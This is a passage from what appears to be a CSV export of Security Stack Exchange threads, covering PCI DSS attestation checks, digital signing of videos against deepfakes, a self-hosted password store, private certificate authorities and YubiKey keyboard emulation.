<p>I'm not sure this flaw was chained with real attacks, but it could facilitate attacks. You can generate HTTP activity after an error in the response stream. Not implementing the forced <code>connection: close</code> on errors is a flaw that a lot of HTTP servers have, not only previous versions of Apache. I think what we see here is a way of preventing future issues by being more strict on HTTP RFC, and that's something Apache is doing more and more recently, like with the <code>HttpProtocolOptions Strict</code> directive.</p>
","1"
"260678","260678","How to check validity of a PCI DSS Attestation of Compliance certificate?","<p>I've been sent a certificate of compliance with PCI DSS (v. 3.2.1) in the form of a PDF. In it company A (issuer) claims that company B passed a formal assessment and is a level 2 merchant.</p>
<p>What options do I have to be more or less convinced that it was not just mocked up by the company and has actual merit?</p>
","0","3","260683","<p>I don't have first-hand experience with this, so I welcome a corrected answer from someone who does, but as far as I know, you should be able to find company A somewhere <a href=""https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors"" rel=""nofollow noreferrer"">on the QSA list</a> on the PCI council site.  Once you've found them, you can contact them to confirm that they did, in fact, issue that certificate to company B.</p>
<p>Odds are good that it's valid, because faking a PCI audit would be easy to catch, but it's always good to confirm if you have any doubts.</p>
","0"
"260678","260678","How to check validity of a PCI DSS Attestation of Compliance certificate?","<p>I've been sent a certificate of compliance with PCI DSS (v. 3.2.1) in the form of a PDF. In it company A (issuer) claims that company B passed a formal assessment and is a level 2 merchant.</p>
<p>What options do I have to be more or less convinced that it was not just mocked up by the company and has actual merit?</p>
","0","3","260696","<p>Visa has been very firm in saying the only legitimate lookup of a service provider is to check the <a href=""https://usa.visa.com/splisting/splistingindex.html"" rel=""nofollow noreferrer"">splisting</a>.  They discourage the use of documents claiming PCI compliance, as those cannot be as up-to-date as the online database.</p>
","1"
"260678","260678","How to check validity of a PCI DSS Attestation of Compliance certificate?","<p>I've been sent a certificate of compliance with PCI DSS (v. 3.2.1) in the form of a PDF. In it company A (issuer) claims that company B passed a formal assessment and is a level 2 merchant.</p>
<p>What options do I have to be more or less convinced that it was not just mocked up by the company and has actual merit?</p>
","0","3","260707","<p>The only document to rely on that an entity has been independently assessed as complaint is an Attestation of Compliance, which is a formal document completed by a Qualified Security Assessor (QSA). It is a few pages long. As @Bobson says, you can validate the status of the QSA  that carried out an assessment here.</p>
<p><a href=""https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors"" rel=""nofollow noreferrer"">https://www.pcisecuritystandards.org/assessors_and_solutions/qualified_security_assessors</a></p>
<p>A 'certificate' is a worthless piece of paper. The PCI SSC has an FAQ describing why.</p>
<p><a href=""https://pcissc.secure.force.com/faq/articles/Frequently_Asked_Question/Are-compliance-certificates-recognized-for-PCI-DSS-validation"" rel=""nofollow noreferrer"">https://pcissc.secure.force.com/faq/articles/Frequently_Asked_Question/Are-compliance-certificates-recognized-for-PCI-DSS-validation</a></p>
<blockquote>
<p>The only documentation recognized for PCI DSS validation are the
official documents from the PCI SSC website.  Any other form of
certificate or documentation issued for the purposes of illustrating
compliance to PCI DSS or any other PCI standard are not authorized or
validated, and their use is not acceptable for evidencing compliance.</p>
</blockquote>
<p>Also, and I appreciate that this is into the &quot;weeds&quot; of PCI lore, but an assessor is not able to say what &quot;level&quot; a service provider is. The concept of service provider levels is based on brands (i.e. Mastercard and Visa) service provider compliance programs. If the service provider has decided to apply to be on Visa's list, then you can also validate their compliance by looking at the list (although I caution against that because there are some service providers who get one environment or application assessed so they can be on the list but who offer many others that were not assessed) . However, if they say &quot;we are level 2&quot;, Visa does not require an on-site assessment (i.e. an audit) of a level 2 service provider, so what you have at best is a self-assessment with some arbitrary &quot;validation&quot; by a QSA. The only evidence of PCI DSS compliance of a third party that shows they have been independently assessed is an &quot;Attestation of Compliance for Onsite Assessments -- Service Providers&quot; - you can see the blank version of this document here:</p>
<p><a href=""https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-AOC-ServiceProviders.docx"" rel=""nofollow noreferrer"">https://www.pcisecuritystandards.org/documents/PCI-DSS-v3_2_1-AOC-ServiceProviders.docx</a></p>
<p>So if you have a document that looks like this and which is signed by a valid QSA then you have evidence of the service provider's PCI DSS compliance. Anything else is just optimistic paperwork.</p>
","2"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260537","<p>In theory, yes. Signing a video file with a private key and then publishing the public key is no different than signing some text and then publishing it.</p>
<p>But this doesn't really solve the problem. For example, imagine someone filmed a video of me putting on two differently colored socks - which, as we all know, is one of the worst imaginable crimes. The person, who shot the video, signs it with their private key and publishes it.</p>
<p>Now I vehemently deny the legitimacy of the video, saying it was obviously faked and I would never wear differently-colored socks. As it turns out, my claim was correct. Someone shot a video of me wearing socks and then modified the video file, to alter the color of one of my socks. He then signed this modified file and published it.</p>
<p>As you see from this example, signing a video really doesn't &quot;verify&quot; that the content of the video is &quot;legitimate&quot; in one way or another.</p>
<h3>In fact...</h3>
<p>it makes things even worse. &quot;Deep Fakes&quot; are primarily a social problem, meaning that a significant amount of people believe that the content of the video is real, despite it not being so. You cannot fix social problems with technology, as that tends to <a href=""https://xkcd.com/1914/"" rel=""noreferrer"">create even more social problems</a>.</p>
<p>By adding a simple green checkmark of &quot;Legitimate&quot; to a video, you essentially teach people not to engage their brains and question what they see, and instead create a shortcut of &quot;checkmark = truth&quot;. And while <em>some</em> people might not be fooled by it, keep in mind that propaganda doesn't need to work on everyone, just enough people.</p>
<p>In short: The best way to combat deep fakes is to teach people to think critically.</p>
","65"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260545","<p>I agree with the others that have opined on this question that a signature on the video in itself does little to authenticate the video.  What matters is <em>who</em> made the signature.</p>
<p>In that regard, it's similar to the system of PKI that we use to authenticate SSL certificates on the web.  Our web browsers do not trust just any signature on an SSL certificate - our browsers only trust signatures made by certificate authorities (CA's) that our browsers trust.  We put our trust in these CA's to authenticate certificates on the web, and if the certificate has a valid signature by a trusted CA, then we feel confident that the certificate is authentic.</p>
<p>Perhaps we could we have a similar ecosystem to authenticate videos, using 'video authorities' (VA's ?) that we trust.  If I trust @EasyWhenUknowHow as one of my trusted VA's, and the video has a valid signature by @EasyWhenUknowHow, which I've verified using EasyWhenUknowHow's public key, then I can feel confident that the video is authentic.  I smell a business opportunity...</p>
","4"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260556","<p>Yes, this is possible and there is already an initiative to implement this called <a href=""https://c2pa.org/"" rel=""nofollow noreferrer"">The Coalition for Content Provenance and Authenticity (C2PA)</a> containing major industry partners.</p>
<p>From their summary, trusted hardware will digitally sign information about a media object (image or video) when it's created, and as the object is modified those transformations are also signed.</p>
","1"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260557","<p><strong>Yes, you can use cryptography to authenticate video sources</strong>.</p>
<p><strong>No, you cannot use cryptography to prove a video is authentic</strong> (and prevent deepfakes).</p>
<p>If these statements sound contradictory, read on.</p>
<hr />
<h2>What has been tried</h2>
<p>This has been done in the past by camera manufacturers like Nikon and Canon, who wanted to assure pictures taken with the cameras could be &quot;authenticated&quot;.</p>
<p>The <a href=""https://blog.elcomsoft.com/2011/04/nikon-image-authentication-system-compromised/"" rel=""noreferrer"">Nikon Image Authentication System</a> was quickly broken by a simple firmware dump attack.</p>
<p>It's important to note that virtually all known schemes that attempted to provide security against a physical attacker have failed so far (sometimes in secret, for a while). The general saying is that <em>&quot;If an attacker has physical access to my machine, all bets are off&quot;</em>.</p>
<h2>How good could it possibly get?</h2>
<p>If someone developed a perfectly secure system that resisted attacks for many years (with the help of tamper-proof chips / <a href=""https://en.wikipedia.org/wiki/Trusted_Platform_Module"" rel=""noreferrer"">TPMs</a>), it would only ever be able to verify something very narrow: that the produced image/video was indeed <strong>processed by a certain company/manufacturer</strong>, or <strong>certified as true from a certain government / news source</strong></p>
<p>This is useful for ensuring <strong>provenance</strong> (who says what?) in some controlled scenarios, but doesn't help at all for ensuring <strong>authenticity</strong> (what is real?) of the content.</p>
<p>Things this system doesn't prevent include:</p>
<ul>
<li>A government certifying a fake video as genuine, <a href=""https://www.msn.com/en-xl/news/other/ukraine-photo-of-chinese-army-heading-to-russia-is-fake-news-beijing-says/ar-AAVeeLZ"" rel=""noreferrer"">claiming other governments are lying</a>.</li>
<li>A smartphone company being coerced by a government into producing a few phones that allow secret fakes to be produced (by <a href=""https://www.washingtonpost.com/world/2022/03/12/russia-putin-google-apple-navalny/"" rel=""noreferrer"">threatening company employees, for example</a>)</li>
<li>A criminal stealing the signing keys from a company server and selling them to the highest bidder (if the receiver only uses it twice on obscure videos, the public will never know about the problem)</li>
<li>A person projecting a fake image into the certified camera lens (see <a href=""https://en.wikipedia.org/wiki/Analog_hole"" rel=""noreferrer"">analog hole</a>)</li>
</ul>
<hr />
<h2>What new problems are you creating?</h2>
<p>So let's say these limitations don't bother you and you want to go ahead and build the system anyway. After all, no system is perfect, and something is better than nothing, right?</p>
<p>Once you create this system that certifies what is real, several things are likely to happen:</p>
<ul>
<li>The local government will eventually become the decider of which images are true or false (through direct control or regulation)</li>
<li>Independent news media will gradually vanish (there's no need for alternative viewpoints when everyone trusts the same source)</li>
<li>Over time, people will stop doing any research. Scams will become more prevalent (since people don't practice critical thinking skills).</li>
<li>People that hold beliefs that contradict the state narrative will be ostracized</li>
</ul>
<hr />
<p>tl;dr: <strong>Cryptography is useful, but it can't replace trust. Centralizing decisions about trustworthiness leads to poor outcomes</strong></p>
","31"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260569","<p>This is analogous to how big media companies and some governments &quot;think&quot; - there is good content, and there is bad content. The good content is somehow marked as good, anything else is bad. Good people control the &quot;good&quot; mark. All problems solved.</p>
<p>Why the <a href=""https://en.wikipedia.org/wiki/Evil_bit"" rel=""noreferrer"">evil bit</a>-type solutions don't work is more or less widely known.</p>
<p>Why the <a href=""https://en.wikipedia.org/wiki/Ministries_of_Nineteen_Eighty-Four"" rel=""noreferrer"">ministry of truth</a>-type solutions are risky and of limited use is also known.</p>
<p>Besides, the deepfake technology is just one more technology. We have cinema industry for a good century now. We have makeup experts that can paint anyone's face over an actor. Deepfake is not any better except maybe being cheaper and faster, to an extent.</p>
<p>On the other hand, the whole deepfake drama in the recent times stems from the possibility to publish an information anonymously. This is an important feature of more or less free societies and an important tool for keeping them free. In regrad to this, an occasional deepfake now and then are not that much of a high price.</p>
<p>What you propose will not kill deepfakes, it will kill anonymity. This is pretty much not the same.</p>
<hr />
<p>This is not to say that digital signing of a camera footage is not legitimately used for other purposes. Security cameras, dash cameras, professional reporter cameras do this (as well as extensive digital signature-based timestamping). This (especially the third-party timestamping) in some cases can be used to prove authenticity.</p>
","6"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260570","<p>Think about the private key distribution for a minute. Who do you think should be able to sign videos?</p>
<ul>
<li><p>users registering freely. This doesn't give videos any additional trustworthiness: why would I trust a video signed by <code>user@example.com</code>?</p>
</li>
<li><p>users which confirm their identity. This would make things worse: users posting videos would lose anonymity. People will be intimidated to post fakes, but they will also be intimidated to post controversial or anti-government content. Plus, I still won't be able to decide with reasonable certainty whether to trust a video from <code>John Doe, 42 Random str., Metropolis</code> or not.</p>
</li>
<li><p>certified recording equipment. This would make fake videos somewhat harder to produce: a fake video maker will not be able to use just a video editor. You still won't be able to tell if the video was <a href=""https://i.stack.imgur.com/enYEA.jpg"" rel=""noreferrer"">staged</a> or not, whether it really displays the place and the people it <a href=""https://i.stack.imgur.com/GnhYr.jpg"" rel=""noreferrer"">claims</a> to represent, etc. Plus, you'll automatically mistrust videos from users who don't have the certified equipment, which are not necessarily fakes.</p>
</li>
<li><p>certified organizations. Those don't need to sign their videos at all: they can simply publish their videos on their own website, and unless their website is cracked you can be sure those videos are made by them. If they decided to post a fake, they'll have to problem to forge the signature as well.</p>
</li>
</ul>
<p>An of course, all these options still allow for scenarios where the private key gets compromised, or trusted parties become malicious under government pressure or criminal threats. Discussing these scenarios only makes sense if there is an option that works.</p>
","5"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260588","<p>There are two very different points here.</p>
<ol>
<li><p>Can we sign digital videos:</p>
<p>Obviously yes, a video file is nothing but a file and it is possible to take a hash of it and sign it. From that point there is an unbreakable bond between the signed file and the signer</p>
</li>
<li><p>What will that guarantee:</p>
<p>The video will deserve exactly the same trust that the signature does. If a well known press company signs a document (whatever the content) and you do trust that company, then you can trust the document. If somebody you do not know signs the document with a reputable non-repudiation signature emitted by a reputable CA, that means that an individual human being will be liable for the content of the file and that legal actions could be used is it was a fake - well if all that occured in a <em>reputable country</em>... Less strong that the first use case, but the fear of legal actions is usually enough to calm down many people. If the signature has no <em>legal</em> value (or only little one depending of the country it was emitted in), it just means that the document has not been modified since it was produced. Nothing less nothing more. Specifically it makes no evidence that it is or not a fake.</p>
</li>
</ol>
<p>An interesting outcome of this is that you cannot full rely on a browser for that. You can find certificates emitted by reputable CA for Chinese or Russion citizens. As far as I am concerned, I would not trust a video about Ukraine war if it was by a Russian organization or citizen. Because I would not trust the Russian legal courts to have the same sight on truth that I would have...</p>
","0"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260606","<p>Any person or organization X can sign any data (a video or otherwise) attesting various things, including...</p>
<ul>
<li>Claiming to be the creator.</li>
<li>Claiming the content is true.</li>
<li>Claiming that it really is them in the video.</li>
</ul>
<p>But the signature can be applied whether or not the claim is true or false.  So, the signature by itself does not prove if the content is real or not.  It only proves that someone <strong>claims</strong> it is, and possibly who is making the claim.</p>
<p>So how do we use that?</p>
<ol>
<li><strong>We can prove when someone supports a claim of veracity, but not when they deny it.</strong></li>
</ol>
<p>If a party wants to deny any involvement with some content, then they simply can refuse to sign it.  That is an open problem.  But conversely, if a video featuring person X is signed by person X, then we can at least know that X is claiming it's really them.</p>
<p>With respect to &quot;Deep Fakes&quot; there is little practical difference between...</p>
<ul>
<li>A fake video of person X claiming opinion Y really signed by person X.</li>
<li>A real video of person X claiming opinion Y really signed by person X.</li>
</ul>
<p>In both cases the signature itself proves that X claims Y.  One can't know if X is lying, but that would also be true if you were in the room with them as they said it.</p>
<p>In summary we can't know if a video of X is fake if X claims its fake.  But we can know if X claims it's true.</p>
<ol start=""2"">
<li><strong>Things can change if there is a policy of signing all &quot;offical&quot; content.</strong></li>
</ol>
<blockquote>
<p>Then if a video had no mark, we would know it was rubbish.</p>
</blockquote>
<p>That's an interesting proposition.  A lack of a signature doesn't prove the content is fake, but it does prove that person X did not choose to claim it is true.</p>
<p>If person X had a policy of <strong>always</strong> signing any official content, and the content is merely claiming that X has opinion Y, then a lack of a signature by X is a pretty strong indicator that X doesn't claim to have that opinion.</p>
<ol start=""3"">
<li><strong>A signature allows a claim of veracity to live on at a later date.</strong></li>
</ol>
<p>Often times we get content (videos included) from trusted websites.  But the content often gets copied and lives on long after it's taken down from the website.  A signature can prove that that a specific website at one time claimed to have hosted it.</p>
<ol start=""4"">
<li><strong>We can prove that a party once claimed that content was true, even if they now deny they ever made that claim.</strong></li>
</ol>
<p>Public figures often proudly put out content only to later deny its existence.</p>
<p>Just knowing that someone claims something can actually be useful by itself, whether or not the claim is true.  For example, politician X wants to unequivocally pronounce their support of popular cause Y by signing some content and putting it on their website.  10 years later, cause Y is really unpopular, and the content is removed from their website.</p>
<p>Now politician X want to deny that they ever really supported cause Y, but their opponent digs a signed copy out of an internet archive (proving that X is now either lying or really did support Y).</p>
<p>A shrewd politician manages to talk a lot without every really saying anything, and certainly never digitally signs something.  But not all of them are that wise, and this use-case would probably occur quite a lot.</p>
<ol start=""5"">
<li><strong>We can decide how much to trust the content based on how much we trust the signer.</strong></li>
</ol>
<p>In general, we can't know for sure if the content of a video is true, but we might try to assess the probability of veracity, based on how much we trust the signer.  It's not perfect, but it's a useful heuristic that humans use all the time.</p>
","3"
"260536","260536","Could videos be authenticated using private and public keys?","<p>I saw a news report about now freely available software to make &quot;deepfake&quot; videos. Couldn't videos be internally marked using a private key, so that everyone could verify the originator using a public key? This could be built in to browsers so that everyone could see if something was fake or not.</p>
<p>Is it technically possible to mark a video stream throughout with something that can't be spoofed or removed? Then if a video had no mark, we would know it was rubbish.</p>
","20","9","260625","<p>When signing code packages, one of the things we often have to obtain is a signed timestamp from <a href=""https://knowledge.digicert.com/generalinformation/INFO4231.html"" rel=""nofollow noreferrer"">Digicert</a> or someone. If the timestamp could be obtained from a reputable source and cryptographically linked with the video, you would have a basis to prove that the video was generated at the purported <em>time</em> of the event, where a deepfake would likely take a significant amount of time to generate.</p>
<p>That doesn't solve everything, of course. You could have a pre-trained deepfake model ready to go, or you might not be able to prove the time of the event in the video, but it would go a long way to proving authenticity. I do think MechMK1's answer makes an important point in saying that trust and opinion often matter more than proof.</p>
","0"
"260520","260520","Manage passwords from my personal website","<p>So I'm a complete novice in security practices, and an amateur web developer. I have a personal website connected to a personal DB. Currently there is nothing in this DB that would be useful to anyone but me, and I wouldn't care if any of it was stolen. I've had a probably stupid idea, and I'd like some help evaluating HOW stupid, and what I can do to make it slightly less stupid.</p>
<p>I'd like to add a table to my DB to store all my passwords, and add functionality to my website which would allow me to read and write to that table. The obvious and very valid objections to this are: &quot;the personal website of an amateur is probably not at all secure and very hackable. If someone gets access, they'll be able to steal everything.&quot; I can think of a few ways to make this bad result less likely. Here's how I'm picturing it working:</p>
<ol>
<li>Log in to my admin account on my website.</li>
<li>Make a request to get my passwords. Before the request goes out, I have to pass two-factor authentication.</li>
<li>The passwords are encrypted in the db and still encrypted when they are received on the client-side. I store the key completely separate from the website/DB.</li>
</ol>
<p>Is the above design secure enough to make this a reasonable thing to do? If not, is there something else I could do to improve it?</p>
<p>PS: I am aware that there are password management services available. Please indulge my desire to 'do it myself'</p>
","2","3","260524","<p>First off:</p>
<ul>
<li>make sure your database is not vulnerable to injection</li>
<li>make sure your admin password is not bruteforceable and the authentication is not bypass-able (by session forging or similar)</li>
<li>Make sure your database cannot be accessed without auth, because if you just keep it as a <code>wget</code>-able endpoint ... that's just making it easy to dump</li>
<li>obligatory reminder to check for the <a href=""https://owasp.org/www-project-top-ten/"" rel=""nofollow noreferrer"">OWASP top 10</a></li>
</ul>
<p>If the passwords are stored encrypted, the website is not your weakest link, but it seems quite inconvenient to have to enter in your passwords in encrypted form and also have to decrypt them. At that point, why store them in your website at all (I presume the purpose of storing them there is accessibility, however keeping them encrypted defeats the purpose so you may benefit from reconsidering this endeavor altogether)</p>
<p>To answer your question: if a <em>secure</em> (at the very least, make sure it isn't in <a href=""https://www.kaggle.com/wjburns/common-password-list-rockyoutxt"" rel=""nofollow noreferrer"">rockyou.txt</a>) master key stays unconnected to your website, your only risk is the database being dumped with hashes cracked offline (which is doable, so make sure you use strong enough encryption - AES-256 should work for your purposes). This also applies for MiTM attacks and other sniffing, but quite honestly your risk is low here (doesn't mean you shouldn't follow best practices though).</p>
<p>In conclusion, given the way you implemented your website, the UX seems awkward and the project rather pointless, however it's secure enough, given your protection measures are properly implemented.</p>
","1"
"260520","260520","Manage passwords from my personal website","<p>So I'm a complete novice in security practices, and an amateur web developer. I have a personal website connected to a personal DB. Currently there is nothing in this DB that would be useful to anyone but me, and I wouldn't care if any of it was stolen. I've had a probably stupid idea, and I'd like some help evaluating HOW stupid, and what I can do to make it slightly less stupid.</p>
<p>I'd like to add a table to my DB to store all my passwords, and add functionality to my website which would allow me to read and write to that table. The obvious and very valid objections to this are: &quot;the personal website of an amateur is probably not at all secure and very hackable. If someone gets access, they'll be able to steal everything.&quot; I can think of a few ways to make this bad result less likely. Here's how I'm picturing it working:</p>
<ol>
<li>Log in to my admin account on my website.</li>
<li>Make a request to get my passwords. Before the request goes out, I have to pass two-factor authentication.</li>
<li>The passwords are encrypted in the db and still encrypted when they are received on the client-side. I store the key completely separate from the website/DB.</li>
</ol>
<p>Is the above design secure enough to make this a reasonable thing to do? If not, is there something else I could do to improve it?</p>
<p>PS: I am aware that there are password management services available. Please indulge my desire to 'do it myself'</p>
","2","3","261005","<p>Not very experienced in security, but it's one of my hobbies and I try to learn as much as possible.</p>
<p>Some thoughts:</p>
<ul>
<li><p>Assume your database is going to be copied. It's not a question of <em>if</em> but a question of <em>when</em>. Make sure it's really hard to get useful info from the DB without the proper secrets.</p>
</li>
<li><p>If at all possible, don't store your secrets in the server having the web / database. They <em>will</em> be stolen too.</p>
</li>
<li><p>The secrets <em>could</em> be encrypted with a key derived from the client's password. Without this password, you can neither decrypt the secrets nor the database.</p>
</li>
<li><p>As I've recently been made aware of, most password leaks are not by breaking but by user's fault: phishing, etc.</p>
</li>
<li><p>Don't go crazy on encryption, see <a href=""https://xkcd.com/538/"" rel=""nofollow noreferrer"">xkcd: Security</a></p>
</li>
</ul>
","0"
"260520","260520","Manage passwords from my personal website","<p>So I'm a complete novice in security practices, and an amateur web developer. I have a personal website connected to a personal DB. Currently there is nothing in this DB that would be useful to anyone but me, and I wouldn't care if any of it was stolen. I've had a probably stupid idea, and I'd like some help evaluating HOW stupid, and what I can do to make it slightly less stupid.</p>
<p>I'd like to add a table to my DB to store all my passwords, and add functionality to my website which would allow me to read and write to that table. The obvious and very valid objections to this are: &quot;the personal website of an amateur is probably not at all secure and very hackable. If someone gets access, they'll be able to steal everything.&quot; I can think of a few ways to make this bad result less likely. Here's how I'm picturing it working:</p>
<ol>
<li>Log in to my admin account on my website.</li>
<li>Make a request to get my passwords. Before the request goes out, I have to pass two-factor authentication.</li>
<li>The passwords are encrypted in the db and still encrypted when they are received on the client-side. I store the key completely separate from the website/DB.</li>
</ol>
<p>Is the above design secure enough to make this a reasonable thing to do? If not, is there something else I could do to improve it?</p>
<p>PS: I am aware that there are password management services available. Please indulge my desire to 'do it myself'</p>
","2","3","261017","<p>They key point is how you are encrypting the database. If you are saving emails there, an attacker can deduce the contents of an encrypted field if you are using the wrong operation mode (like AES-ECB).</p>
<p>You don't even need to store the key anywhere. You can use a random symmetric key, encrypt the data with it, and use an asymmetric key to encrypt the symmetric one. Use a KDF (such as <a href=""https://en.wikipedia.org/wiki/PBKDF2"" rel=""nofollow noreferrer"">PBKDF2</a> or <a href=""https://en.wikipedia.org/wiki/Argon2"" rel=""nofollow noreferrer"">Argon2</a>) to generate the key, so you don't need to store it anywhere. If you need to change the master password, you only have to re-encrypt the symmetric key. Use AES-GCM, AES-CTR or AES-CBC and you are good to go.</p>
<p>Encrypt everything client-side, so no plaintext data gets transmitter, even on TLS. If an attacker manages to compromise your site, he could dump the data if there's any plaintext data there. Encrypting and decrypting client-side is safer.</p>
<p>With those two things you don't need admin passwords, or TOTP, not even keep the database private. An encrypted database consisting of AES-GCM-256 encrypted data is pretty much unbeatable without the password.</p>
","0"
"260494","260494","Auto-certification of internal services, does it make sense?","<p>I work for a big insurance company, they have created a certification authority to generate certificates for their internal webservices. These webservices are accessible from their intranet only and are called by their applications and services only.
Does this situation make sense? They certify to themselves that they are the owner of their services. Since they are not a recognized certification authority, they have to embed their CA certificate in all their applications.</p>
<p>It seems to me that using a certificate in this situation just does not make sense, they should just encrypt the communications with HTTPS. If they really want to certify the ownership of their webservices, then they should buy a certificate from a recognized certification authority. The certification authority should be a third party.</p>
","1","3","260495","<p>You can’t (easily) “just encrypt the communications with HTTPS”. Most web browsers don’t have an option to encrypt without authenticating, because it’s an enormous security hole.</p>
<p>And there’s nothing wrong with being your own CA in this scenario. When you say ”The certification authority should be a third party”, that’s not right. The CA should be trusted by the user (which in practice means trusted by the creator of the user’s browser software), which requires it to be a third party on the public Internet because you can’t practicably establish a trust relationship with every website. But in a corporate Intranet you can trust your employer, so no third party is needed.</p>
","3"
"260494","260494","Auto-certification of internal services, does it make sense?","<p>I work for a big insurance company, they have created a certification authority to generate certificates for their internal webservices. These webservices are accessible from their intranet only and are called by their applications and services only.
Does this situation make sense? They certify to themselves that they are the owner of their services. Since they are not a recognized certification authority, they have to embed their CA certificate in all their applications.</p>
<p>It seems to me that using a certificate in this situation just does not make sense, they should just encrypt the communications with HTTPS. If they really want to certify the ownership of their webservices, then they should buy a certificate from a recognized certification authority. The certification authority should be a third party.</p>
","1","3","260498","<p>The organization described has implemented a Private CA.</p>
<p>Whenever an organization creates its own local CA without going for a commercial external one, it’s called a private CA.</p>
<p>The certificates are signed with the private key of the organization’s root certificate. This cert is distributed to all devices to allow for verification.</p>
<p>Private CAs are used to issue certificates for an organization’s internal network where encryption of sensitive data is required, and only a limited group of users are involved.</p>
<p>This is an appropriate security control for the use case described, and can be used to enable users to authenticate to internal systems (VPNs), secure internal resources and services (databases, email servers), to secure devops build servers and dev/testing environments, as well as for deployment for IoT devices.</p>
","2"
"260494","260494","Auto-certification of internal services, does it make sense?","<p>I work for a big insurance company, they have created a certification authority to generate certificates for their internal webservices. These webservices are accessible from their intranet only and are called by their applications and services only.
Does this situation make sense? They certify to themselves that they are the owner of their services. Since they are not a recognized certification authority, they have to embed their CA certificate in all their applications.</p>
<p>It seems to me that using a certificate in this situation just does not make sense, they should just encrypt the communications with HTTPS. If they really want to certify the ownership of their webservices, then they should buy a certificate from a recognized certification authority. The certification authority should be a third party.</p>
","1","3","260499","<p>Other answers are correct, but I'd like to add a bit on top of them.</p>
<p>Keep in mind that encryption can be easily defeated with a Man-in-the-Middle (MitM) attack.</p>
<p>In the context of HTTPS, this is the primary reason of using a certificate. I am not aware of any way to establish a trusted communication without a third party certifying one end (or even better, both).</p>
<p>Of course, they could also use a self-signed certificate, but having an actual CA brings a lot more flexibility (like replacing the certificate, emitting new ones...).</p>
<p>Last but not least, I don't know that many organization would be willing to deliver you a certificate for a private IP address.</p>
","-1"
"260474","260474","Why do some FIDO security fobs use keyboard emulation mode?","<p>I was troubled from the very beginning by the fact that my U2F security fob acts as a keyboard and theoretically is able to press any key when no one is looking. Sometimes I accidentally touch it and then screen goes mad because of all those keystrokes. It seems to me a pretty bad design choice.</p>
<p>I was <a href=""https://support.yubico.com/hc/en-us/articles/360013790279-The-YubiKey-as-a-Keyboard"" rel=""noreferrer"">reading article by YubiCo</a> with justifications and not much of it makes sense. It says that it’s because of drivers, but following the same logic such a security key can be just a read-only flash drive with some added extra sauce on top for key management without any keyboard jazz.</p>
<p>So why keyboard emulation? Are there any alternative fobs taking a less spooky approach?</p>
","20","5","260478","<p>You'd have to install a new driver on your computer in order to support a fob which doesn't emulate a keyboard, and that comes with its own set of problems (security and compatibility issues). Acting as a HID, or human interface device, ensures that the device is 100% compatible with almost any computer. This isn't any more of a security risk than plugging in <em>any</em> USB device. If anything, it's far more secure because it can get away with not making you install new software.</p>
<p>Any USB device will be able to emulate a HID if it is so programmed, so if you assume the fob you use is compromised or malicious, it doesn't matter if it acts as a keyboard (or another input device) or not, because it <em>can</em>. If you assume the fob is not compromised, then you are not opening yourself up to any attacks just by allowing it to input keys on your computer.</p>
","23"
"260474","260474","Why do some FIDO security fobs use keyboard emulation mode?","<p>I was troubled from the very beginning by the fact that my U2F security fob acts as a keyboard and theoretically is able to press any key when no one is looking. Sometimes I accidentally touch it and then screen goes mad because of all those keystrokes. It seems to me a pretty bad design choice.</p>
<p>I was <a href=""https://support.yubico.com/hc/en-us/articles/360013790279-The-YubiKey-as-a-Keyboard"" rel=""noreferrer"">reading article by YubiCo</a> with justifications and not much of it makes sense. It says that it’s because of drivers, but following the same logic such a security key can be just a read-only flash drive with some added extra sauce on top for key management without any keyboard jazz.</p>
<p>So why keyboard emulation? Are there any alternative fobs taking a less spooky approach?</p>
